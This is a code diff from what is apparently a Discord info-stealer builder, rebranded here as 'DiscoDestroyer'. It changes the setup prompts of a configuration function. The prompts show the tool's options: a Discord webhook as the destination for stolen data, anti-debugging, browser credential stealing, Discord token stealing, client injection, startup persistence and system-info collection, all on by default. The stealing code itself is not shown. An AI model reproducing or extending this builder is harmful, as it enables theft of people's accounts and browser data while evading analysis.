@@ -12,43 +12,43 @@ def get_config() -> dict:
         {
             "type": "input",
             "name": "webhook",
-            "message": "Enter your webhook URL",
+            "message": "[DiscoDestroyer] Enter your webhook URL",
             "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
         },
         {
             "type": "confirm",
             "name": "antidebug",
-            "message": "Enable anti-debugging?",
+            "message": "[DiscoDestroyer] Enable anti-debugging?",
             "default": True,
         },
         {
             "type": "confirm",
             "name": "browsers",
-            "message": "Enable browser stealing?",
+            "message": "[DiscoDestroyer] Enable browser stealing?",
             "default": True,
         },
         {
             "type": "confirm",
             "name": "discordtoken",
-            "message": "Enable Discord token stealing?",
+            "message": "[DiscoDestroyer] Enable Discord token stealing?",
             "default": True,
         },
         {
             "type": "confirm",
             "name": "injection",
-            "message": "Enable Discord injection?",
+            "message": "[DiscoDestroyer] Enable Discord injection?",
             "default": True,
         },
         {
             "type": "confirm",
             "name": "startup",
-            "message": "Enable startup?",
+            "message": "[DiscoDestroyer] Enable startup?",
             "default": True,
         },
         {
             "type": "confirm",
             "name": "systeminfo",
-            "message": "Enable system info?",
+            "message": "[DiscoDestroyer] Enable system info?",
             "default": True,
         },
     ]
